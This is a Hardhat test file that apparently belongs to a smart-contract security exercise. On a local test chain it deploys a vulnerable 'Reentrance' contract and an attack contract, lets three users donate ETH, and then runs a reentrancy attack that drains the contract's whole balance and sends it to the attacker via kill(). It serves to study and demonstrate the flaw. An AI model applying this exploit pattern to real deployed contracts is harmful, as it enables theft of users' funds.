const { expect } = require("chai");
const { ethers } = require("hardhat");

require('chai')
    .use(require('chai-as-promised'))
    .should()

describe("Reentrance", function () {
  it("Should drain all the funds", async function () {

    const [reentrance_owner, attack_owner, user1, user2, user3] = await ethers.getSigners();
    
    const Reentrance = await ethers.getContractFactory("Reentrance", reentrance_owner);
    const ReentranceAttack = await ethers.getContractFactory("ReentranceAttack", attack_owner);

    const reentrance = await Reentrance.deploy();
    const reentranceAttack = await ReentranceAttack.deploy(reentrance.address);

    console.log(`Reentrance deployed to ${reentrance.address}`);
    console.log(`ReentranceAttack deployed to ${reentranceAttack.address}`);

    await reentrance.connect(user1).donate(user1.address, {value: ethers.utils.parseEther('1.0')});
    await reentrance.connect(user2).donate(user2.address, {value: ethers.utils.parseEther('1.0')});
    await reentrance.connect(user3).donate(user3.address, {value: ethers.utils.parseEther('1.0')});

    expect(await reentrance.balances(user1.address)).to.equal(ethers.utils.parseEther('1.0'));
    expect(await reentrance.balances(user2.address)).to.equal(ethers.utils.parseEther('1.0'));
    expect(await reentrance.balances(user3.address)).to.equal(ethers.utils.parseEther('1.0'));

    const attacker_balance_before = await ethers.provider.getBalance(attack_owner.address);
    console.log(`\nAttacker balance before: ${ethers.utils.formatEther(attacker_balance_before)} ETH`);

    console.log(`\nCurrent balance of Reentrance before attack is: ${ethers.utils.formatEther(await ethers.provider.getBalance(reentrance.address))} ETH`);

    console.log('\n------ Attacking Reentrance.sol... ------');
    await reentranceAttack.connect(attack_owner).attack({value: ethers.utils.parseEther('0.5')});

    console.log(`\nCurrent balance of Reentrance after attack is: ${ethers.utils.formatEther(await ethers.provider.getBalance(reentrance.address))} ETH`);

    expect(ethers.utils.formatEther(await ethers.provider.getBalance(reentrance.address))).to.equal('0.0');

    await reentranceAttack.connect(reentrance_owner).kill().should.be.rejected;
    console.log('\nTransfering funds to the Attacker...');
    await reentranceAttack.connect(attack_owner).kill().should.be.fulfilled;

    const attacker_balance_after = await ethers.provider.getBalance(attack_owner.address);
    console.log(`Attacker balance after: ${ethers.utils.formatEther(attacker_balance_after)} ETH`);
  });
});
